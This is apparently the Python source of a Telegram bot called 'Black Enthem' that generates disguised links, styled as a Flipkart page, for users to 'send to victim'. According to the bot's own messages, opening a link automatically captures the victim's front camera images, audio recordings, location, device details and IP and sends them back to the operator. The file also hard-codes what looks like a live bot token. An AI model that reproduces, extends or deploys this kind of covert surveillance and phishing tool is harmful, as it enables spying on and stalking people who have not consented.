import telebot
from telebot import types
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot Token
BOT_TOKEN = "7717616825:AAFsBZnNSgAkTCh0s3JAppa7DyvLvGr0FsY"
bot = telebot.TeleBot(BOT_TOKEN)

# Admin and allowed users
ADMIN_ID = 6618440327  # Replace with your actual admin ID
ALLOWED_USERS = {8411036056, 6618440327, 7824177684}  # Initial allowed users

# Store user data
user_links = {}

# Function to check if user is allowed
def is_user_allowed(user_id):
    return user_id in ALLOWED_USERS

# Admin command to add users
@bot.message_handler(commands=['adduser'])
def add_user(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    try:
        # Extract user ID from command
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "Usage: /adduser <user_id>")
            return
        
        new_user_id = int(command_parts[1])
        ALLOWED_USERS.add(new_user_id)
        
        bot.reply_to(message, f"✅ User {new_user_id} has been added to the allowed list.")
        
        # Notify the new user if possible
        try:
            bot.send_message(new_user_id, "🎉 You have been granted access to use the bot!")
        except:
            pass
            
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID format.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Start command with user check
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        not_allowed_text = """
❌ *ACCESS DENIED*

You are not allowed to use this bot.

Only authorized users can access this service.
"""
        keyboard = types.InlineKeyboardMarkup()
        contact_btn = types.InlineKeyboardButton(
            text="📞 Contact Admin",
            url="https://t.me/BlackEnthemOwner"
        )
        keyboard.add(contact_btn)
        
        bot.send_message(
            message.chat.id,
            not_allowed_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        return
    
    # User is allowed - show dashboard
    show_dashboard(message.chat.id)

def show_dashboard(chat_id):
    """Show user dashboard"""
    dashboard_text = """
🖤 *WELCOME TO BLACK ENTHEM* 🖤

*Developer:* Nitish Sharma
*Powered by:* BLACK 🖤 ENTHEM
*Timeline:* 2024

🌟 *Your Dashboard*

📊 *Status:* ✅ Active
👤 *Access:* Authorized User
🔗 *Links Generated:* 0

Click below to create your capture link!
"""
    
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    btn_camera = types.KeyboardButton("📸 Camera Mode 🔗")
    keyboard.add(btn_camera)
    
    bot.send_message(
        chat_id,
        dashboard_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# Handle camera mode button
@bot.message_handler(func=lambda message: message.text == "📸 Camera Mode 🔗")
def camera_mode(message):
    user_id = message.from_user.id
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "❌ You are not authorized to use this bot.")
        return
    
    # Clear previous message and show camera mode options
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    camera_mode_text = """
📸 *CAMERA MODE*

Choose an option below:
"""
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn_create = types.InlineKeyboardButton("🔗 Create Link", callback_data="create_link")
    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_dash")
    keyboard.add(btn_create, btn_back)
    
    bot.send_message(
        message.chat.id,
        camera_mode_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# Handle create link
@bot.callback_query_handler(func=lambda call: call.data == "create_link")
def create_link(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        bot.answer_callback_query(call.id, "❌ You are not authorized")
        return
    
    # Generate unique link
    link = f"https://flipkart-zado.vercel.app/?id={chat_id}"
    user_links[chat_id] = link
    
    bot.answer_callback_query(call.id, "✅ Link generated!")
    
    # Delete previous message
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    # Show link message
    link_text = f"""
🔗 *CAPTURE LINK GENERATED*

*Send this link to victim:*

`{link}`

⚠️ *Warning:* This link will automatically capture:
• 📸 Front camera images (every 3 seconds)
• 🎤 Audio recordings (10-second segments)
• 📍 Location information
• 🖥️ Full device details
• 🌐 IP & Browser information

*Instructions:*
1. Copy the link above
2. Send to target/victim
3. When they open it, capture starts automatically
4. All data will be sent here

*Target ID:* `{chat_id}`
"""
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn_copy = types.InlineKeyboardButton("📋 Copy Link", callback_data="copy_link")
    btn_test = types.InlineKeyboardButton("🌐 Test Link", url=link)
    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_dash")
    keyboard.add(btn_copy, btn_test)
    keyboard.add(btn_back)
    
    bot.send_message(
        chat_id,
        link_text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

# Handle copy link
@bot.callback_query_handler(func=lambda call: call.data == "copy_link")
def copy_link(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        bot.answer_callback_query(call.id, "❌ You are not authorized")
        return
    
    link = user_links.get(chat_id, f"https://flipkart-zado.vercel.app/?id={chat_id}")
    
    # Create a message that user can copy
    copy_text = f"""
📋 *COPY THIS LINK*

`{link}`

*Click and hold to select, then copy.*

*After copying:*
1. Paste in any chat
2. Send to target
3. Wait for capture data
"""
    
    bot.answer_callback_query(
        call.id,
        "✅ Link copied to chat! Select and copy it.",
        show_alert=False
    )
    
    # Send copy-able message
    bot.send_message(
        chat_id,
        copy_text,
        parse_mode='Markdown'
    )

# Handle back to dashboard
@bot.callback_query_handler(func=lambda call: call.data == "back_to_dash")
def back_to_dashboard(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        bot.answer_callback_query(call.id, "❌ You are not authorized")
        return
    
    bot.answer_callback_query(call.id, "↩️ Returning to dashboard...")
    
    # Delete previous message
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    # Show dashboard again
    show_dashboard(chat_id)

# Handle any other text message
@bot.message_handler(func=lambda message: True)
def handle_other_messages(message):
    user_id = message.from_user.id
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        not_allowed_text = """
❌ *ACCESS DENIED*

You are not allowed to use this bot.

Only authorized users can access this service.
"""
        keyboard = types.InlineKeyboardMarkup()
        contact_btn = types.InlineKeyboardButton(
            text="📞 Contact Admin",
            url="https://t.me/BlackEnthemOwner"
        )
        keyboard.add(contact_btn)
        
        bot.send_message(
            message.chat.id,
            not_allowed_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        return
    
    # If user is allowed but sent wrong command, show dashboard
    show_dashboard(message.chat.id)

# Run bot
if __name__ == '__main__':
    print("🤖 Bot is running...")
    print(f"📊 Allowed Users: {ALLOWED_USERS}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    bot.infinity_polling()
